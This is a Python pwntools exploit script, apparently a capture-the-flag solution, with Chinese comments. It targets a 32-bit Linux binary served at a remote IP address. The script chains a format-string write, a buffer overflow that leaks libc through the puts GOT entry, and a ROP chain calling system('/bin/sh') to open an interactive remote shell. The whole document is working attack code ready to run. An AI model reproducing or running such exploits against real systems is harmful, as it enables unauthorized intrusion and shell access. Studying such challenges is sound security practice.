
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# ====== 已知准确的偏移 ======
PUTS_OFFSET = 0x6d1e0
SYSTEM_OFFSET = 0x41360
BINSH_OFFSET = 0x18c363

# ====== 完美的gadget ======
pop_ebx_ret = 0x08049380  # pop ebx; pop esi; pop edi; pop ebp; ret

# ====== 连接服务器 ======
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

# ====== Step 1: 设置target_val=5 ======
target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("没触发vuln！")
    conn.close()
    exit(1)
log.success("vuln已触发！")

# ====== Step 2: 泄露libc基址 ======
payload = b'A' * 148
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vuln'])
payload += p32(1)
payload += p32(elf.got['puts'])
payload += p32(4)
conn.send(payload)
time.sleep(2)
response = conn.recv(timeout=5)
puts_leak = u32(response[:4])
libc_base = puts_leak - PUTS_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
binsh_addr = libc_base + BINSH_OFFSET
log.info(f"libc: 0x{libc_base:x}, system: 0x{system_addr:x}, /bin/sh: 0x{binsh_addr:x}")

# ====== Step 3: 构造最简单的ROP链！ ======
payload2 = b'A' * 148

# 设置ebx为0！这样调用system时就不会崩溃了！
payload2 += p32(pop_ebx_ret)
payload2 += p32(0x0)  # ebx = 0
payload2 += p32(0x0)  # esi
payload2 += p32(0x0)  # edi
payload2 += p32(0x0)  # ebp

# 调用system！
payload2 += p32(system_addr)
payload2 += p32(0xdeadbeef)  # 返回地址，无所谓，我们直接要shell
payload2 += p32(binsh_addr)   # system的参数

log.info("发送最简单的payload...")
conn.send(payload2)
time.sleep(1)

# 进入交互模式
log.info("🎉🎉🎉 进入交互模式！")
conn.interactive()

conn.close()
